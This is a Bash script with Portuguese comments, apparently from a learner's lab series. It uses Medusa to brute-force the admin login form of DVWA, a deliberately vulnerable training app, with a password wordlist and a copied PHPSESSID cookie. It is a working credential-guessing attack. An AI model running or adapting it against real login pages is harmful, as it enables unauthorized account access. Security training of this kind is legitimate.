#!/bin/bash
#
# 02-dvwa-webform.sh
#
# Script pra tentar várias senhas no login do DVWA. Esse foi o que mais
# me deu trabalho de entender porque formulário web não é igual
# FTP/SMB, tem que descobrir o "jeito" que o site responde quando o
# login dá errado (o tal do F= aqui embaixo).
#
# IMPORTANTE: precisa pegar o cookie PHPSESSID antes, se não o DVWA
# nem deixa chegar no POST de login. Pra pegar: abre o DVWA no
# navegador, entra na tela de login, aperta F12, vai em
# Application/Storage > Cookies e copia o valor do PHPSESSID.
#
# Como usar: ./02-dvwa-webform.sh <IP_DO_ALVO> <PHPSESSID>

set -euo pipefail

ALVO="${1:-}"
SESSID="${2:-}"
USUARIO="admin"
SENHAS="../wordlists/senhas.txt"
SAIDA="../resultados/dvwa-webform-$(date +%Y%m%d-%H%M%S).txt"

if [ -z "$ALVO" ] || [ -z "$SESSID" ]; then
    echo "Uso: $0 <IP_DO_ALVO> <PHPSESSID>"
    echo "Tipo assim: $0 192.168.56.103 a1b2c3d4e5f6g7h8i9j0"
    echo
    echo "(lembra de pegar o PHPSESSID no navegador antes, F12 > cookies)"
    exit 1
fi

mkdir -p ../resultados

echo "[*] Vendo se o DVWA ta respondendo em http://$ALVO/..."
curl -s -o /dev/null -w "%{http_code}" "http://$ALVO/login.php" | grep -q "200" || {
    echo "[!] Não consegui acessar http://$ALVO/login.php, confere o IP"
    exit 1
}

echo "[*] Rodando o Medusa no formulario de login..."
echo "[*] Alvo: $ALVO"
echo "[*] Usuario fixo (padrao do DVWA): $USUARIO"
echo "[*] Lista de senhas: $SENHAS"
echo

# -h  host alvo
# -u  usuario fixo (no DVWA o login padrao costuma ser admin)
# -P  lista de senhas
# -M  modulo web-form
# -m  aqui que configura o formulario:
#       FORM:"<pagina>:<corpo do post>:<texto que aparece quando FALHA>"
#       ^USER^ e ^PASS^ o Medusa troca sozinho pelos valores testados
#       COOKIE: manda o PHPSESSID junto, sem isso o DVWA ignora o POST
medusa -h "$ALVO" -u "$USUARIO" -P "$SENHAS" -M web-form \
  -m FORM:"/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
  -m COOKIE:"PHPSESSID=$SESSID; security=low" \
  -t 3 -O "$SAIDA"

echo
echo "[*] Acabou! Resultado em: $SAIDA"
echo "[*] Login certo (se achou):"
grep -i "SUCCESS" "$SAIDA" || echo "    (nenhum dessa vez - talvez o cookie tenha expirado, tenta pegar um novo)"
